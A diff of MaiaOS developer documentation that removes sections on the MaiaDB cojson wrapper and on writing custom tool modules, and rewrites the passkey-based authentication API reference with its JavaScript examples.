-**Lifecycle**:
-1. `addSubscriber()` → Creates `node.subscribe()` if first subscriber
-2. `addSubscriber()` (again) → Reuses existing subscription
-3. `removeSubscriber()` → Decrements count, schedules cleanup if 0
-4. Wait 5 seconds → Cleanup destroys subscription
-5. `addSubscriber()` before timeout → Cancels cleanup
-
-**Used by MaiaDB:**
-- `db.read()` adds subscriber automatically
-- Subscriptions persist for 5 seconds after last use
-- All subscriptions cleaned up on `db.destroy()`
-
-## Loading States
-
-**Three States**:
-```javascript
-import { CoValueLoadingState } from '@maiaos/maia-cojson';
-
-CoValueLoadingState.LOADING      // "loading"
-CoValueLoadingState.LOADED       // "loaded"
-CoValueLoadingState.UNAVAILABLE  // "unavailable"
-```
-
-**Loading State Object**:
-```javascript
-{
-  $isLoaded: false,
-  $id: "co_z123...",
-  $loadingState: "unavailable" | "error" | "circular",
-  $error: "Error message" // if error
-}
-```
-
-## Reloading CoValues from Storage
-
-When you modify a CoValue and need to reload it from IndexedDB (after `waitForStorageSync` completes), you must use the correct pattern to avoid cached instances.
-
-### The Problem: Cached Instances
-
-**Wrong Pattern** (returns cached instance):
-```javascript
-// ❌ This returns the in-memory cached instance, NOT reloaded from storage
-const coValueCore = node.getCoValue(id);
-const content = coValueCore.getCurrentContent();
-const value = content.get("key"); // May not reflect persisted changes!
-```
-
-**Why this fails:**
-- `node.getCoValue()` returns a cached CoValue instance that's already in memory
-- Even after `waitForStorageSync()` persists changes to IndexedDB, the cached instance may not reflect those changes
-- This causes "value not found" errors when trying to access recently modified data
-
-### The Solution: Load from Storage
-
-**Correct Pattern** (loads from IndexedDB):
-```javascript
-// ✅ This actually loads from IndexedDB storage
-// Note: node.load() returns the content directly (already calls getCurrentContent())
-const content = await node.load(id);
-if (content === 'unavailable') {
-  throw new Error('CoValue unavailable after persistence');
-}
-const value = content.get("key"); // Reflects persisted changes!
-```
-
-**Why this works:**
-- `await node.load(id)` triggers actual loading from IndexedDB
-- Returns the content directly (already calls `getCurrentContent()` internally)
-- Ensures you see modifications that were synced via `waitForStorageSync()`
-
-### When to Use Each Pattern
-
-**Use `getCoValue()` when:**
-- You want the current in-memory instance (no reload needed)
-- You're setting up subscriptions to listen for updates
-- You're checking if a CoValue exists and is available
-
-**Use `await node.load()` when:**
-- You need to reload from storage after modifications
-- You're accessing a CoValue for the first time after it was persisted
-- You need to ensure you have the latest persisted state
-
-### Real-World Example: Account Modifications
-
-```javascript
-// During migration - modify account
-account.set("os", accountOs.id, "trusting");
-account.set("data", accountData.id, "trusting");
-
-// Persist to IndexedDB
-await node.syncManager.waitForStorageSync(account.id);
-
-// ❌ Wrong: Cached instance may not reflect changes
-const cachedAccount = node.getCoValue(account.id).getCurrentContent();
-const osId = cachedAccount.get("os"); // May be undefined!
-
-// ✅ Correct: Reload from storage
-// Note: node.load() returns the content directly
-const freshAccount = await node.load(account.id);
-if (freshAccount === 'unavailable') {
-  throw new Error('Account unavailable');
-}
-const osId = freshAccount.get("os"); // Correctly reflects persisted value!
-```
-
-### Subscription Pattern (Correct Use of getCoValue)
-
-When setting up subscriptions, `getCoValue()` is correct:
-
-```javascript
-// ✅ Correct for subscriptions
-const coValueCore = node.getCoValue(id);
-if (!coValueCore.isAvailable()) {
-  // Trigger loading from storage
-  await node.loadCoValueCore(id);
-}
-
-// Subscribe to updates
-coValueCore.subscribe((core) => {
-  if (core.isAvailable()) {
-    const content = core.getCurrentContent();
-    // Handle updates...
-  }
-});
-```
-
-This pattern:
-1. Gets the cached instance with `getCoValue()`
-2. Checks if it's available with `isAvailable()`
-3. If not available, triggers loading with `loadCoValueCore()`
-4. Subscribes to future updates
-
-**Key Difference:** Subscriptions use `getCoValue()` + `loadCoValueCore()` for reactive updates, while reloading uses `await node.load()` for immediate access to persisted state.
-
-
-## Integration with MaiaScript
-
-### Basic Integration
-
-```javascript
-// In MaiaScript engine
-import { MaiaDB } from '@maiaos/maia-cojson';
-
-// Initialize once
-const db = new MaiaDB({ node, accountID, group });
-
-// Register schemas at startup
-const todoSchemaId = await db.registerSchema("Todo", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    description: { type: "string" },
-    done: { type: "boolean" }
-  },
-  required: ["title"]
-});
-
-// Use in intent handlers
-async function createTodo(title, description) {
-  return await db.create({
-    schemaId: todoSchemaId,
-    data: { title, description, done: false }
-  });
-}
-
-async function loadTodos(todoListId) {
-  const list = await db.read({
-    id: todoListId
-  });
-  
-  // list is reactive - updates automatically!
-  return list;
-}
-
-async function updateTodo(todoId, updates) {
-  await db.update({
-    id: todoId,
-    data: updates
-  });
-}
-```
-
-### With Schema Registry
-
-```javascript
-// schemas/todo.schema.json
-{
-  "type": "co-map",
-  "properties": {
-    "title": { "type": "string" },
-    "done": { "type": "boolean" }
-  },
-  "required": ["title"]
-}
-
-// In MaiaScript - load and register schema
-const todoSchemaJson = await loadSchemaFile("todo");
-const todoSchemaId = await db.registerSchema("Todo", todoSchemaJson);
-
-const todo = await db.create({
-  schemaId: todoSchemaId,
-  data: { title: "Buy milk", done: false }
-});
-```
-
-## Performance Considerations
-
-### Caching
-
-**Two-level cache**:
-1. **Instance Cache (WeakMap)**: Same raw → same wrapper
-2. **Subscription Cache (Map)**: Same co-id → shared subscription
-
-**Benefits**:
-- O(1) lookups
-- No duplicate subscriptions
-- Automatic GC
-
-### Lazy Loading
-
-**References loaded on-demand**:
-- Co-id strings stored directly (lightweight)
-- Resolved only when accessed
-- Loading state returned immediately (non-blocking)
-
-### Cleanup
-
-**5-second timeout** prevents:
-- Subscription churn (rapid sub/unsub)
-- Memory leaks (old subscriptions)
-- Unnecessary `node.subscribe()` calls
-
-## Advanced Topics
-
-### Custom Schemas
-
-**Extend base schemas**:
-```javascript
-const BASE_POST = {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    content: { type: "string" },
-  },
-};
-
-const BLOG_POST = {
-  ...BASE_POST,
-  properties: {
-    ...BASE_POST.properties,
-    author: { type: "co-id" },
-    likes: { type: "number" },
-  },
-  required: ["title", "content", "author"],
-};
-```
-
-### Nested Structures
-
-**CoList of CoMaps**:
-```javascript
-// Register schemas
-const postSchemaId = await db.registerSchema("SimplePost", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" }
-  },
-  required: ["title"]
-});
-
-const postsListSchemaId = await db.registerSchema("PostsList", {
-  type: "co-list",
-  items: {
-    type: "co-id",
-    "$ref": `https://maia.city/${postSchemaId}`
-  }
-});
-
-// Create list
-const posts = await db.create({
-  schemaId: postsListSchemaId,
-  data: []
-});
-
-// Add post
-const post = await db.create({
-  schemaId: postSchemaId,
-  data: { title: "Post 1" }
-});
-
-await db.update({
-  id: posts.$id,
-  data: [post]  // Stores co-id reference
-});
-```
-
-### Direct Wrapper Access
-
-**Low-level API still available**:
-```javascript
-import { CoMap } from '@maiaos/maia-cojson';
-
-// Direct access to raw CRDT
-const coMap = CoMap.fromRaw(rawCoMap, schema);
-
-coMap.title = "Hello";
-console.log(coMap._raw.get("title")); // Direct raw access
-```
-
-## Troubleshooting
-
-### Common Issues
-
-**1. "Validation failed: must have required property"**
-- Check schema `required` array
-- Ensure all required fields provided in `data`
-
-**2. "CoValue unavailable"**
-- Co-id doesn't exist or not synced yet
-- Check `timeout` option in `db.read()`
-- Verify network/peer connectivity
-
-**3. "Loading state returned instead of value"**
-- CoValue not yet loaded
-- Use loading state: `if (!value.$isLoaded) { /* show loading */ }`
-
-**4. Tests fail with "asArray is not a function"**
-- Using mock instead of real RawCoList
-- Fix: Use `group.createList()` from real cojson
-
-## Best Practices
-
-### 1. Always Define Schemas
-
-```javascript
-// ✅ Good
-const TODO_SCHEMA = {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    done: { type: "boolean" },
-  },
-  required: ["title"],
-};
-
-const todo = await o.create({
-  type: "co-map",
-  schema: TODO_SCHEMA,
-  data: { title: "Task", done: false },
-});
-
-// ❌ Bad
-const todo = await o.create({
-  type: "co-map",
-  schema: {}, // Empty schema = no validation!
-  data: { anything: "goes" },
-});
-```
-
-### 2. Use References for Relationships
-
-```javascript
-// ✅ Good (reference)
-const post = await o.create({
-  type: "co-map",
-  schema: POST_SCHEMA,
-  data: {
-    title: "Hello",
-    author: authorCoMap, // Stores as co-id
-  },
-});
-
-// ❌ Bad (nested object)
-const post = await o.create({
-  type: "co-map",
-  schema: POST_SCHEMA,
-  data: {
-    title: "Hello",
-    author: {
-      name: "Alice", // Stores as plain JSON (not collaborative!)
-    },
-  },
-});
-```
-
-### 3. Handle Loading States
-
-```javascript
-const post = await db.read({ id });
-
-if (!post.$isLoaded) {
-  // Show loading UI
-  return <div>Loading...</div>;
-}
-
-// Use post data
-return <div>{post.title}</div>;
-```
-
-### 4. Clean Up Subscriptions
-
-```javascript
-// When component unmounts
-db.destroy(); // Clears all subscriptions
-```
-
-## About cojson
-
-**cojson** is Jazz's core CRDT library that provides the foundational data structures for collaborative applications. MaiaDB wraps cojson with a high-level, JSON-native API.
-
-**What cojson provides:**
-- Core CRDT types: CoMap, CoList, CoStream, CoBinary
-- Local-first synchronization
-- Conflict-free collaborative editing
-- Efficient binary protocol
-- IndexedDB persistence
-
-**What MaiaDB adds:**
-- Operations-based API (`o.db({ op })`)
-- JSON Schema validation and introspection
-- Schema-as-CoMaps architecture
-- Automatic subscription management
-- Deep reference resolution
-- LLM-friendly JSON configurations
-
-MaiaDB is the high-level interface; cojson is the low-level engine.
-
-## Package Information
-
-- **Name**: `@maiaos/maia-cojson` (kernel), `@maia/script` (operations engine)
-- **Version**: `0.17.0`
-- **Dependencies**: `cojson@^0.19.21`, `ajv@^8.12.0`
-- **Test Command**: `bun test`
-- **Dev Server**: `bun dev` (http://localhost:4200)
-
-## Example App
-
-See [`libs/maia-script/src/vibes/blog/`](../../maia-script/src/vibes/blog/) for a complete working example demonstrating:
-- MaiaOS initialization with `createMaiaOS()`
-- Operations-based API (`o.db({ op })`)
-- Schema registration and management
-- CRUD operations with validation
-- Deep resolution of references
-- Inspector view of loaded CoValues
-
-Run: `cd libs/maia-script && bun dev`, then open http://localhost:4200/vibes/blog/
-
-## Future Enhancements
-
-**Advanced Operations:**
-- `subscribe`: Explicit subscription management
-- `query`: Advanced filtering and querying
-- `migrate`: Schema migration operations
-- `transaction`: Multi-operation atomicity
-
-**Higher-Order Types:**
-- **CoFeed**: Activity streams
-- **CoVector**: Threaded comments
-- **ImageDefinition**: Profile pictures with metadata
-
-**Framework Integrations:**
-- Svelte stores
-- React hooks
-- Native reactive bindings
-
-## Contributing
-
-When contributing to MaiaDB:
-
-**Zero Mocks Policy**:
-- ✅ All tests MUST use real cojson types
-- ✅ Real LocalNode initialization
-- ✅ Real co-id generation (`co_z...`)
-- ❌ NO Mock classes
-- ❌ NO stubs or fakes
-
-**Test Requirements**:
-```javascript
-// Required imports
-import { LocalNode } from "cojson";
-import { WasmCrypto } from "cojson/crypto/WasmCrypto";
-
-// Setup
-beforeAll(async () => {
-  const crypto = await WasmCrypto.create();
-  const { node, accountID } = await LocalNode.withNewlyCreatedAccount({
-    creationProps: { name: "Test User" },
-    peers: [],
-    crypto,
-  });
-  const group = node.createGroup();
-  // Use real CRDTs in tests!
-});
-```
-
-## Resources
-
-- **Source Code**: `libs/maia-cojson/`
-- **Tests**: `libs/maia-cojson/src/**/**.test.js`
-- **Example App**: `libs/maia-cojson/src/app/`
-- **Cojson Docs**: [Jazz Documentation](https://jazz.tools)
-
-## License
-
-Part of MaiaOS project
-
----
-
-# 08_TOOLS
-
-*Source: developers/08_tools.md*
-
-# Tools Guide (Developer)
-
-**For developers** who want to create custom tools and tool modules to extend MaiaOS functionality.
-
-## What Are Tools?
-
-Tools are **executable functions** that state machines invoke to perform actions. They are the ONLY place where imperative code lives in MaiaOS.
-
-### Tool Characteristics
-
-- ✅ **Pure functions** - Same input → same output
-- ✅ **Context mutation** - Modify `actor.context`
-- ✅ **Async operations** - API calls, database queries
-- ✅ **Schema-agnostic** - Work with any data model
-- ✅ **AI-compatible** - Defined with JSON schemas
-
-## Tool Structure
-
-Each tool consists of **two files**:
-
-### 1. Tool Definition (`*.tool.maia`)
-AI-compatible metadata in JSON format:
-
-```json
-{
-  "$type": "tool",
-  "$id": "tool_notify_001",
-  "name": "@custom/notify",
-  "description": "Shows a notification to the user",
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "message": {
-        "type": "string",
-        "description": "Notification message",
-        "required": true
-      },
-      "type": {
-        "type": "string",
-        "enum": ["info", "success", "error", "warning"],
-        "description": "Notification type",
-        "default": "info"
-      },
-      "duration": {
-        "type": "number",
-        "description": "Duration in milliseconds",
-        "default": 3000
-      }
-    },
-    "required": ["message"]
-  }
-}
-```
-
-### 2. Tool Function (`*.tool.js`)
-Executable JavaScript:
-
-```javascript
-export default {
-  async execute(actor, payload) {
-    const { message, type = 'info', duration = 3000 } = payload;
-    
-    // Validate inputs
-    if (!message) {
-      throw new Error('Message is required');
-    }
-    
-    // Mutate context
-    if (!actor.context.notifications) {
-      actor.context.notifications = [];
-    }
-    
-    const notification = {
-      id: Date.now().toString(),
-      message,
-      type,
-      timestamp: Date.now()
-    };
-    
-    actor.context.notifications.push(notification);
-    
-    // Auto-clear after duration
-    setTimeout(() => {
-      actor.context.notifications = actor.context.notifications.filter(
-        n => n.id !== notification.id
-      );
-      actor.actorEngine.rerender(actor);
-    }, duration);
-    
-    console.log(`📬 Notification: ${message} (${type})`);
-  }
-};
-```
-
-## Creating a Tool Module
-
-### Step 1: Organize Tool Files
-
-```
-o/tools/
-└── notifications/
-    ├── show.tool.maia
-    ├── show.tool.js
-    ├── clear.tool.maia
-    ├── clear.tool.js
-    ├── clearAll.tool.maia
-    └── clearAll.tool.js
-```
-
-### Step 2: Create Tool Definitions
-
-**`o/tools/notifications/show.tool.maia`:**
-```json
-{
-  "$type": "tool",
-  "$id": "tool_notifications_show",
-  "name": "@notifications/show",
-  "description": "Display a notification",
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "message": {"type": "string", "required": true},
-      "type": {"type": "string", "enum": ["info", "success", "error"]},
-      "duration": {"type": "number", "default": 3000}
-    }
-  }
-}
-```
-
-**`o/tools/notifications/clear.tool.maia`:**
-```json
-{
-  "$type": "tool",
-  "$id": "tool_notifications_clear",
-  "name": "@notifications/clear",
-  "description": "Clear a specific notification by ID",
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "id": {"type": "string", "required": true}
-    }
-  }
-}
-```
-
-### Step 3: Implement Tool Functions
-
-**`o/tools/notifications/show.tool.js`:**
-```javascript
-export default {
-  async execute(actor, payload) {
-    const { message, type = 'info', duration = 3000 } = payload;
-    
-    if (!actor.context.notifications) {
-      actor.context.notifications = [];
-    }
-    
-    const notification = {
-      id: Date.now().toString(),
-      message,
-      type,
-      timestamp: Date.now()
-    };
-    
-    actor.context.notifications.push(notification);
-    
-    setTimeout(() => {
-      actor.context.notifications = actor.context.notifications.filter(
-        n => n.id !== notification.id
-      );
-      actor.actorEngine.rerender(actor);
-    }, duration);
-    
-    console.log(`✅ [notifications/show] ${message} (${type})`);
-  }
-};
-```
-
-**`o/tools/notifications/clear.tool.js`:**
-```javascript
-export default {
-  async execute(actor, payload) {
-    const { id } = payload;
-    
-    if (!actor.context.notifications) return;
-    
-    const before = actor.context.notifications.length;
-    actor.context.notifications = actor.context.notifications.filter(
-      n => n.id !== id
-    );
-    const after = actor.context.notifications.length;
-    
-    console.log(`✅ [notifications/clear] Cleared notification ${id} (${before - after} removed)`);
-  }
-};
-```
-
-**`o/tools/notifications/clearAll.tool.js`:**
-```javascript
-export default {
-  async execute(actor, payload) {
-    const count = actor.context.notifications?.length || 0;
-    actor.context.notifications = [];
-    console.log(`✅ [notifications/clearAll] Cleared ${count} notifications`);
-  }
-};
-```
-
-### Step 4: Create Module Definition
-
-**`o/modules/notifications.module.js`:**
-```javascript
-export class NotificationsModule {
-  static async register(registry, toolEngine) {
-    const tools = ['show', 'clear', 'clearAll'];
-    
-    console.log(`[NotificationsModule] Registering ${tools.length} tools...`);
-    
-    for (const tool of tools) {
-      await toolEngine.registerTool(
-        `notifications/${tool}`,      // Tool path (relative to o/tools/)
-        `@notifications/${tool}`       // Tool name (namespace + name)
-      );
-    }
-    
-    registry.registerModule('notifications', NotificationsModule, {
-      version: '1.0.0',
-      description: 'User notification system',
-      namespace: '@notifications',
-      tools: tools.map(t => `@notifications/${t}`)
-    });
-    
-    console.log('[NotificationsModule] Registration complete');
-  }
-}
-
-export default NotificationsModule;
-```
-
-### Step 5: Load Module at Boot
-
-```javascript
-// In your app's index.html or boot script
-const os = await MaiaOS.boot({
-  modules: ['core', 'mutation', 'dragdrop', 'notifications']
-});
-```
-
-### Step 6: Use in State Machine
-
-```json
-{
-  "states": {
-    "idle": {
-      "on": {
-        "CREATE_TODO": "creating"
-      }
-    },
-    "creating": {
-      "entry": [
-        {
-          "tool": "@mutation/create",
-          "payload": {
-            "schema": "todos",
-            "data": {"text": "$newTodoText", "done": false}
-          }
-        },
-        {
-          "tool": "@notifications/show",
-          "payload": {
-            "message": "Todo created!",
-            "type": "success",
-            "duration": 2000
-          }
-        }
-      ],
-      "on": {
-        "SUCCESS": "idle"
-      }
-    }
-  }
-}
-```
-
-## Advanced Tool Patterns
-
-### Tool with External API
-
-```javascript
-// o/tools/api/fetchWeather.tool.js
-export default {
-  async execute(actor, payload) {
-    const { city } = payload;
-    
-    try {
-      const response = await fetch(
-        `https://api.weather.com/v1/current?city=${city}`
-      );
-      
-      if (!response.ok) {
-        throw new Error(`Weather API error: ${response.status}`);
-      }
-      
-      const data = await response.json();
-      
-      // Store in context
-      actor.context.weather = {
-        city,
-        temperature: data.temp,
-        condition: data.condition,
-        timestamp: Date.now()
-      };
-      
-      console.log(`✅ [api/fetchWeather] Got weather for ${city}: ${data.temp}°`);
-    } catch (error) {
-      console.error(`❌ [api/fetchWeather] Failed:`, error);
-      throw error; // Will trigger ERROR event in state machine
-    }
-  }
-};
-```
-
-### Tool with Database Integration
-
-```javascript
-// o/tools/db/saveToDatabase.tool.js
-export default {
-  async execute(actor, payload) {
-    const { collection, data } = payload;
-    
-    try {
-      // Use IndexedDB, localStorage, or external DB
-      const db = await openDB('myapp', 1);
-      const tx = db.transaction(collection, 'readwrite');
-      const store = tx.objectStore(collection);
-      
-      const id = await store.add(data);
-      
-      // Update context with saved ID
-      if (actor.context[collection]) {
-        const item = actor.context[collection].find(i => i.id === data.id);
-        if (item) {
-          item.dbId = id;
-        }
-      }
-      
-      await tx.done;
-      console.log(`✅ [db/saveToDatabase] Saved to ${collection}: ${id}`);
-    } catch (error) {
-      console.error(`❌ [db/saveToDatabase] Failed:`, error);
-      throw error;
-    }
-  }
-};
-```
-
-### Tool with Complex Validation
-
-```javascript
-// o/tools/validation/validateEmail.tool.js
-export default {
-  async execute(actor, payload) {
-    const { email, field = 'email' } = payload;
-    
-    // Validation logic
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const isValid = emailRegex.test(email);
-    
-    // Store validation result in context
-    if (!actor.context.validation) {
-      actor.context.validation = {};
-    }
-    
-    actor.context.validation[field] = {
-      value: email,
-      isValid,
-      error: isValid ? null : 'Invalid email format',
-      timestamp: Date.now()
-    };
-    
-    if (!isValid) {
-      throw new Error('Invalid email format');
-    }
-    
-    console.log(`✅ [validation/validateEmail] Valid: ${email}`);
-  }
-};
-```
-
-### Tool with Side Effects (Analytics)
-
-```javascript
-// o/tools/analytics/trackEvent.tool.js
-export default {
-  async execute(actor, payload) {
-    const { event, properties = {} } = payload;
-    
-    // Send to analytics service
-    if (window.gtag) {
-      window.gtag('event', event, properties);
-    }
-    
-    // Log to console in development
-    if (import.meta.env.DEV) {
-      console.log(`📊 [analytics/trackEvent] ${event}`, properties);
-    }
-    
-    // Store in context for debugging
-    if (!actor.context.analyticsEvents) {
-      actor.context.analyticsEvents = [];
-    }
-    
-    actor.context.analyticsEvents.push({
-      event,
-      properties,
-      timestamp: Date.now()
-    });
-    
-    // Keep only last 50 events
-    if (actor.context.analyticsEvents.length > 50) {
-      actor.context.analyticsEvents.shift();
-    }
-  }
-};
-```
-
-## Generic vs Specific Tools
-
-### Generic Tool Pattern
-Works with any schema/data:
-
-```javascript
-// @mutation/create (generic)
-export default {
-  async execute(actor, payload) {
-    const { schema, data } = payload;
-    const entity = { id: Date.now().toString(), ...data };
-    actor.context[schema].push(entity);
-  }
-};
-```
-
-Usage:
-```json
-{"tool": "@mutation/create", "payload": {"schema": "todos", "data": {...}}}
-{"tool": "@mutation/create", "payload": {"schema": "notes", "data": {...}}}
-```
-
-### Specific Tool Pattern
-Hardcoded for one use case:
-
-```javascript
-// @todos/createTodo (specific)
-export default {
-  async execute(actor, payload) {
-    const { text } = payload;
-    const todo = {
-      id: Date.now().toString(),
-      text,
-      done: false,
-      createdAt: Date.now()
-    };
-    actor.context.todos.push(todo);
-  }
-};
-```
-
-**When to use which:**
-- **Generic** - Library tools (core, mutation, dragdrop)
-- **Specific** - App-specific business logic
-
-## Tool Best Practices
-
-### ✅ DO:
-
-- **Validate inputs** - Check required fields
-- **Handle errors gracefully** - Try/catch and meaningful messages
-- **Log operations** - Help debugging
-- **Keep pure** - No global state, only `actor.context`
-- **Be async** - Even if synchronous (consistency)
-- **Document parameters** - Clear JSON schema
-- **Use schema-agnostic patterns** - When possible
-
-### ❌ DON'T:
-
-- **Don't mutate actor properties** - Only `context` is safe
-- **Don't call other tools directly** - Use state machine
-- **Don't store state in tool** - Stateless functions only
-- **Don't block** - Async operations should be fast
-- **Don't use globals** - Pass everything via payload
-- **Don't hardcode** - Parameterize when possible
-
-## Testing Tools
-
-```javascript
-// test-notification-tool.js
-import notifyTool from './o/tools/notifications/show.tool.js';
-
-describe('Notification Tool', () => {
-  it('should add notification to context', async () => {
-    const mockActor = {
-      context: {},
-      actorEngine: {
-        rerender: jest.fn()
-      }
-    };
-    
-    const payload = {
-      message: 'Test notification',
-      type: 'info',
-      duration: 1000
-    };
-    
-    await notifyTool.execute(mockActor, payload);
-    
-    expect(mockActor.context.notifications).toHaveLength(1);
-    expect(mockActor.context.notifications[0].message).toBe('Test notification');
-  });
-  
-  it('should auto-clear after duration', async () => {
-    const mockActor = {
-      context: {},
-      actorEngine: { rerender: jest.fn() }
-    };
-    
-    await notifyTool.execute(mockActor, {
-      message: 'Test',
-      type: 'info',
-      duration: 100
-    });
-    
-    expect(mockActor.context.notifications).toHaveLength(1);
-    
-    await new Promise(resolve => setTimeout(resolve, 150));
-    
-    expect(mockActor.context.notifications).toHaveLength(0);
-  });
-});
-```
-
-## Module Configuration
-
-Advanced module with configuration:
-
-```javascript
-export class DatabaseModule {
-  static config = {
-    dbName: 'myapp',
-    version: 1,
-    stores: ['todos', 'notes', 'users']
-  };
-  
-  static async register(registry, toolEngine) {
-    // Initialize database
-    const db = await this._initDatabase();
-    
-    // Pass db instance to tools (via closure)
-    const tools = ['save', 'load', 'delete'];
-    
-    for (const tool of tools) {
-      const toolPath = `db/${tool}`;
-      const toolName = `@db/${tool}`;
-      
-      // Load and augment tool with db instance
-      const toolModule = await import(`../tools/${toolPath}.tool.js`);
-      toolModule.db = db;
-      
-      await toolEngine.registerTool(toolPath, toolName);
-    }
-    
-    registry.registerModule('database', DatabaseModule, {
-      version: '1.0.0',
-      namespace: '@db',
-      tools: tools.map(t => `@db/${t}`),
-      config: this.config
-    });
-  }
-  
-  static async _initDatabase() {
-    // IndexedDB initialization
-    return await openDB(this.config.dbName, this.config.version, {
-      upgrade(db) {
-        for (const store of DatabaseModule.config.stores) {
-          if (!db.objectStoreNames.contains(store)) {
-            db.createObjectStore(store, { keyPath: 'id', autoIncrement: true });
-          }
-        }
-      }
-    });
-  }
-}
-```
-
-## Next Steps
-
-- Read [Engines Guide](./engines.md) - Creating custom engines
-- Read [DSL Guide](./dsl.md) - Defining new DSL types
-- Read [MaiaOS Guide](./maiaos.md) - Understanding the system
-
----
-
-# 09_AUTHENTICATION
-
-*Source: developers/09_authentication.md*
-
-# Authentication with Passkeys (Self-Sovereign Identity)
-
-## Overview
-
-MaiaOS uses **passkey-based authentication** via WebAuthn PRF for self-sovereign identity. This provides:
-
-- 🔐 **Hardware-backed security** - Keys stored in Secure Enclave/TPM
-- 🔑 **Deterministic accounts** - Same passkey = same account across devices
-- 🚫 **Zero secret storage** - All secrets derived on-demand
-- 🔄 **Cross-device sync** - Automatic via iCloud Keychain/Google Password Manager
-- 🎯 **Self-sovereign** - No server holds your keys
-
-## Quick Start
-
-### 1. Basic Authentication Flow
-
-```javascript
-import { createMaiaOS, signInWithPasskey } from '@MaiaOS/core';
-
-async function init() {
-  // Step 1: Sign in with passkey (auto-detects register vs login)
-  const { accountID, agentSecret } = await signInWithPasskey({
-    salt: "maia.city"  // Default salt
-  });
-  
-  // Step 2: Create MaiaOS with agentSecret
-  const o = await createMaiaOS({ 
-    agentSecret, 
-    name: "Maia" 
-  });
-  
-  console.log("Authenticated as:", accountID);
-}
-```
-
-### 2. Check Sign-In Status
-
-```javascript
-import { isSignedIn, getCurrentAccount } from '@MaiaOS/core';
-
-if (isSignedIn()) {
-  const account = getCurrentAccount();
-  console.log("Already signed in as:", account.accountID);
-  
-  // Auto sign-in
-  await init();
-} else {
-  // Show sign-in UI
-  showSignInPrompt();
-}
-```
-
-### 3. Sign Out
-
-```javascript
-import { signOut } from '@MaiaOS/core';
-
-function handleSignOut() {
-  signOut(); // Clears metadata
-  window.location.reload(); // Reset state
-}
-```
-
-## API Reference
-
-### `signInWithPasskey(options)`
-
-Sign in with existing passkey, or create new if none exists.
-
-**Parameters:**
-- `options.salt` (string, default: "maia.city") - Salt for PRF derivation
-
-**Returns:** `Promise<{accountID: string, agentSecret: Object}>`
-
-**Throws:** If PRF not supported or user cancels
-
-**Example:**
-```javascript
-const { accountID, agentSecret } = await signInWithPasskey({
-  salt: "my-custom-salt"
-});
-```
+## Authentication Functions
 
 ### `signUpWithPasskey(options)`
 
-Explicitly create a new passkey (usually not needed - `signInWithPasskey` auto-detects).
+Create a new passkey and derive deterministic account.
 
 **Parameters:**
-- `options.name` (string, default: "maia") - Display name
-- `options.salt` (string, default: "maia.city") - Salt for PRF
+- `options.name` (string, default: `"maia"`) - Display name for the account
+- `options.salt` (string, default: `"maia.city"`) - Salt for PRF derivation
 
-**Returns:** `Promise<{accountID: string, agentSecret: Object}>`
+**Returns:** `Promise<{accountID: string, agentSecret: Object, node: Object, account: Object, credentialId: string}>`
+
+**Throws:** If PRF not supported
 
 **Example:**
 ```javascript
-const { accountID, agentSecret } = await signUpWithPasskey({
-  name: "Alice",
+import { signUpWithPasskey } from '@MaiaOS/self';
+
+const { accountID, agentSecret, node, account } = await signUpWithPasskey({
+  name: "maia",
   salt: "maia.city"
 });
+
+// accountID: "co_z..." (public identifier)
+// agentSecret: Ephemeral (never store!)
+// node: LocalNode instance (active session)
+// account: RawAccount instance (your cojson account)
 ```
 
-### `isSignedIn()`
+**Note:** Shows 1 biometric prompt (single-passkey flow!)
 
-Check if user has an active session.
+---
 
-**Returns:** `boolean`
+### `signInWithPasskey(options)`
+
+Sign in with existing passkey.
+
+**Parameters:**
+- `options.salt` (string, default: `"maia.city"`) - Salt for PRF derivation (must match signup)
+
+**Returns:** `Promise<{accountID: string, agentSecret: Object, node: Object, account: Object}>`
+
+**Throws:** If PRF not supported or no passkey found
 
 **Example:**
 ```javascript
-if (isSignedIn()) {
-  console.log("User has active session");
-}
+import { signInWithPasskey } from '@MaiaOS/self';
+
+const { accountID, agentSecret, node, account } = await signInWithPasskey({
+  salt: "maia.city"
+});
+
+// Loads existing account from Jazz sync server
+// Returns same structure as signUpWithPasskey
+// ⚡ Only 1 biometric prompt (fast login!)
 ```
 
-### `signOut()`
+**Note:** Shows only 1 biometric prompt (fast login!)
 
-Clear stored metadata (passkey remains in hardware).
+---
 
-**Returns:** `void`
-
-**Example:**
-```javascript
-signOut();
-// Metadata cleared, passkey still in hardware
-```
-
-### `getCurrentAccount()`
-
-Get current account metadata.
-
-**Returns:** `{accountID: string, credentialId: string, salt: string} | null`
-
-**Example:**
-```javascript
-const account = getCurrentAccount();
-if (account) {
-  console.log("Account ID:", account.accountID);
-  console.log("Salt:", account.salt);
-}
-```
+## Feature Detection
 
 ### `isPRFSupported()`
 
-Check if WebAuthn PRF is supported.
+Check if WebAuthn PRF is supported (async version).
 
 **Returns:** `Promise<boolean>`
 
@@ -7848,804 +1362,6328 @@ Check if WebAuthn PRF is supported.
 
 **Example:**
 ```javascript
+import { isPRFSupported } from '@MaiaOS/self';
+
 try {
   await isPRFSupported();
   console.log("PRF supported!");
 } catch (error) {
-  console.error("Not supported:", error.message);
+  console.error(error.message); // Instructions for user
 }
 ```
 
-### `inspectStorage()` (Debug)
+---
 
-Inspect what's stored in localStorage for debugging.
+### `requirePRFSupport()`
 
-**Returns:** `{hasAccount: boolean, accountID: string, securityCheck: string, warnings: string[]}`
+Strictly require PRF support (throws on unsupported browsers).
+
+**Returns:** `Promise<void>`
+
+**Throws:** If not supported, with detailed browser upgrade instructions
 
 **Example:**
 ```javascript
-const report = inspectStorage();
-console.log("Security check:", report.securityCheck); // "PASSED" or "FAILED"
-console.log("Warnings:", report.warnings);
+import { requirePRFSupport } from '@MaiaOS/self';
+
+try {
+  await requirePRFSupport();
+  // PRF is supported, proceed with authentication
+} catch (error) {
+  // Show error message to user with upgrade instructions
+  showBrowserUpgradeMessage(error.message);
+}
 ```
 
-## Integration Patterns
+---
 
-### Pattern 1: Simple Auth Wall
+## Sync State Monitoring
+
+### `subscribeSyncState(listener)`
+
+Subscribe to sync status changes.
+
+**Parameters:**
+- `listener` (Function) - Callback: `(state) => void`
+  - `state.connected` (boolean) - WebSocket connected?
